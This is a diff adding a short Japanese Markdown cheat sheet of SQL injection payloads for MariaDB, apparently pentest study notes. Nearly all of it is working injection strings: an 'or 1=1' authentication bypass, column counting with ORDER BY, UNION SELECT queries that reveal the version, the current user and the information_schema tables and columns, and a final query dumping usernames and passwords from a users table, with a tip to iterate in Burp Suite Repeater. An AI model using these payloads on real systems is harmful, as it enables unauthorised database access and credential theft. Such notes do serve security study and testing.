@@ -1,0 +1,62 @@
+# SQLinjection
+
+* 脆弱性の確認
+
+```
+'or 1=1;#
+```
+
+* 
+
+```
+'or 1=1 LIMIT 1;#
+```
+
+* カラム数の確認
+
+```
+'or 1=1 order by 1;#
+```
+
+カラム数を1から徐々に増やしていくことでテーブルに何カラムあるかがわかる。
+
+カラム数を超えるとSQLがエラーとなる
+
+※Burpsuiteのrepeaterを利用して効率的に確認が可能
+
+* どのカラムが何番目のカラムかの確認
+
+```
+'or 1=1 union all select 1, 2, 3;#
+```
+
+* MariaDBのデータベースバージョンの確認
+
+```
+'or 1=1 union all select 1, 2, @@version;#
+```
+
+* 現在のユーザの確認
+
+```
+'or 1=1 union all select 1, 2, user();#
+```
+
+* スキーマテーブルの確認
+
+```
+'or 1=1 union all select 1, 2, table_name from information_schema.tables;#
+```
+
+* 対象のテーブルのカラムの確認
+
+```
+'or 1=1 union all select 1, 2, column_name from information_schema.columns where table_name='users';#
+```
+
+* 情報の列挙
+
+```
+'or 1=1 union all select 1, username, password from users;#
+```
+
